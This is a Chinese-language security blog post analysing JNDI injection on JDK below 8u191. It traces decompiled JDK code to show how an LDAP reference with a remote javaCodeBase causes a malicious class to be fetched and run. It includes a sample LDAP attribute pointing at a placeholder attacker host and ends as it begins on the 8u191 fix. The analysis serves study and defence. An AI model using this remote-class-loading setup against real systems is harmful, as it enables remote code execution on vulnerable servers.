---
title: JNDI的基础利用总结（下篇）
url: https://mp.weixin.qq.com/s?__biz=Mzk0MTM4NzIxMQ==&mid=2247495055&idx=1&sn=5b6b3b64dd75141d87a7aed3e4a63ab3&chksm=c2d1912bf5a6183d618057410ea45f2793f19e1bf50101a0e2ea8e47b680ca816e1278ac46e3&scene=58&subscene=0#rd
source: Yak Project
date: 2023-03-31
fetch_date: 2025-10-04T11:15:57.823146
---

# JNDI的基础利用总结（下篇）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zFSfqy2CtNLmQAmibSe1ic7mJHqXJTdXGPHGIb9Wp4Wd9a4NFZ7EibLfpA/0?wx_fmt=jpeg)

# JNDI的基础利用总结（下篇）

原创

雨过天晴

Yak Project

![](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZfSpFpvkIFZmQIErFibib1uiaOsLXZKbkicRsicXVN3QYGac0xrqKu7Pxo1UO0YLMiboTs0WCcBUO3qOhhw/640?wx_fmt=gif)

**JNDI核心原理详细分析**

01

加载远程codebase中的reference

**适用前提：**

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zia0bLxUClZjiaRJHyTgzfjaXP6JYIQlW3LiaQFA5Z7UEnLR8Qzibj3AIuQ/640?wx_fmt=png)

* 目标出网
* jdk<8u191

**举例分析**

此处使用的是ldap协议，因此受影响的版本即8u191以下，此处对应的便是SimpleCommand的情况

查询后返回的entry

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zq6TPT0HB6UQ6gyLIgXQJ9GBRDY8RBCRyJmlQJPBle94gEoptKfl0Ng/640?wx_fmt=png)

attribute内容如下

```
{objectclass=objectClass: javaNamingReference, javacodebase=javaCodeBase: http://xxx.xxx.xxx.xxx:8000/#SimpleCommand, javafactory=javaFactory: SimpleCommand, javaclassname=javaClassName: SimpleCommand}
```

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zREYrzWLicLmyfhIgib9bP9Y73XdAonSSHf7t1ke8X3nyYqMW6xSSzN0g/640?wx_fmt=png)

```
 static Object decodeObject(Attributes var0) throws NamingException {        String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));
        try {            Attribute var1;            if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {                ClassLoader var3 = helper.getURLClassLoader(var2);                return deserializeObject((byte[])((byte[])var1.get()), var3);            } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {                return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);            } else {                var1 = var0.get(JAVA_ATTRIBUTES[0]);                return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);            }        } catch (IOException var5) {            NamingException var4 = new NamingException();            var4.setRootCause(var5);            throw var4;        }    }
```

按照此处的逻辑首先拿到var2也就是codebasehttp://host:8000/#SimpleCommand

然后取出javaSerializedData存入var1，此处根本不存在这个属性所以为null，进入下一个分支判断；

取出javaRemoteLocation存入var1， 此处也根本不存在这个属性所以为null，进入最后一个else分支；

取出objectClass存入var1，也就是objectClass: javaNamingReference，此处不为null，进入判断是否包含javaNamingReference，大小写都判断一下是否存在，此处显然存在，因此会进入decodeReference()方法，此处传入两个参数，一个是整个attribute，另一个则是最先拿到的codebase var2

```
private static Reference decodeReference(Attributes var0, String[] var1) throws NamingException, IOException {        String var4 = null;        Attribute var2;        if ((var2 = var0.get(JAVA_ATTRIBUTES[2])) == null) {            throw new InvalidAttributesException(JAVA_ATTRIBUTES[2] + " attribute is required");        } else {            String var3 = (String)var2.get();            if ((var2 = var0.get(JAVA_ATTRIBUTES[3])) != null) {                var4 = (String)var2.get();            }
            Reference var5 = new Reference(var3, var4, var1 != null ? var1[0] : null);            if ((var2 = var0.get(JAVA_ATTRIBUTES[5])) != null) {                BASE64Decoder var13 = null;                ClassLoader var14 = helper.getURLClassLoader(var1);                Vector var15 = new Vector();                var15.setSize(var2.size());                NamingEnumeration var16 = var2.getAll();
                while(var16.hasMore()) {                    String var6 = (String)var16.next();                    if (var6.length() == 0) {                        throw new InvalidAttributeValueException("malformed " + JAVA_ATTRIBUTES[5] + " attribute - " + "empty attribute value");                    }
                    char var9 = var6.charAt(0);                    byte var10 = 1;                    int var11;                    if ((var11 = var6.indexOf(var9, var10)) < 0) {                        throw new InvalidAttributeValueException("malformed " + JAVA_ATTRIBUTES[5] + " attribute - " + "separator '" + var9 + "'" + "not found");                    }
                    String var7;                    if ((var7 = var6.substring(var10, var11)) == null) {                        throw new InvalidAttributeValueException("malformed " + JAVA_ATTRIBUTES[5] + " attribute - " + "empty RefAddr position");                    }
                    int var12;                    try {                        var12 = Integer.parseInt(var7);                    } catch (NumberFormatException var18) {                        throw new InvalidAttributeValueException("malformed " + JAVA_ATTRIBUTES[5] + " attribute - " + "RefAddr position not an integer");                    }
                    int var19 = var11 + 1;                    if ((var11 = var6.indexOf(var9, var19)) < 0) {                        throw new InvalidAttributeValueException("malformed " + JAVA_ATTRIBUTES[5] + " attribute - " + "RefAddr type not found");                    }
                    String var8;                    if ((var8 = var6.substring(var19, var11)) == null) {                        throw new InvalidAttributeValueException("malformed " + JAVA_ATTRIBUTES[5] + " attribute - " + "empty RefAddr type");                    }
                    var19 = var11 + 1;                    if (var19 == var6.length()) {                        var15.setElementAt(new StringRefAddr(var8, (String)null), var12);                    } else if (var6.charAt(var19) == var9) {                        ++var19;                        if (var13 == null) {                            var13 = new BASE64Decoder();                        }
                        RefAddr var17 = (RefAddr)deserializeObject(var13.decodeBuffer(var6.substring(var19)), var14);                        var15.setElementAt(var17, var12);                    } else {                        var15.setElementAt(new StringRefAddr(var8, var6.substring(var19)), var12);                    }                }
                for(int var20 = 0; var20 < var15.size(); ++var20) {                    var5.add((RefAddr)var15.elementAt(var20));                }            }
            return var5;        }    }
```

首先判断是否包含必有属性javaClassName，必须得有这个，没有直接返回，再把javaClassName存入var3，此处值为javaClassName: SimpleCommand，再看看有没有javaFactory，这个是可选，假如有就存入var4，此处是包含的值为javaFactory: SimpleCommand，接着便根据javaClassName，javaFactory和codebase值建立一个Reference。接着判断javaReferenceAddress是否为null，此处属性不含这个，因此跳过。直接返回建立的引用Reference

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3z0mq7DibtQI3r9xJs0wtTdxgvKCO92anynN1NEEEXkzQ6dFf7lzjwThw/640?wx_fmt=png)

返回到ldapCtx

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zJUibsueVzhZOTfY7fKP0LeRSY3mIpYmUsmNQ8gFwdYcXpdLVPeBmu2Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3z9g2voh4hdqfDIxIN5qVr9iaXwYsMriaAoRRZ2ggicBEOkgYTGqtLvzmxg/640?wx_fmt=png)

在此处实例化了远程引用var3

跟进DirectoryManager中的getObjectInstance方法

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zKI4FQN1Hib5nXnyDQXvRXGOQYt6eO9NsDbAE2BwQag85W3GF9YcbodA/640?wx_fmt=png)

核心点

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zic8MZkFW287ibCndMMMB91xmSRLhbQPV7Z1sI4NaC2gibXIRg6ibbaMzeg/640?wx_fmt=png)

factory = getObjectFactoryFromReference(ref, f);

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zweUdKRYHKMjg4QcV5nZr27EAEBVb8wiaRvUGhDWb7II0PSiax2iaVut1g/640?wx_fmt=png)

先尝试本地加载，否则用codebase加载。最终因为加载我们的远程恶意类，再静态方法区嵌入恶意代码，实例化过程中被执行

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zKFjaNdtAttFsVCSDye4zibALJOSjibyj7Ciat5JaLORO3ibmmB0lRYKRTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zNBq1E6uHVbYibBwepd3C5wwKFflejXA8Sl07dR29tefJeicRnXzUfESw/640?wx_fmt=png)

##### **java>8u191 修复原理，对使用codebase进行URLClassloader加载前进行trustURLCodebase判断**

在使用远程codebase进行loadClass时不会像上面这样直接去Class.forName()而是

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfVnlvdkmSOlUs7MGg8YV3zpKicj34THb2S2REvvDW...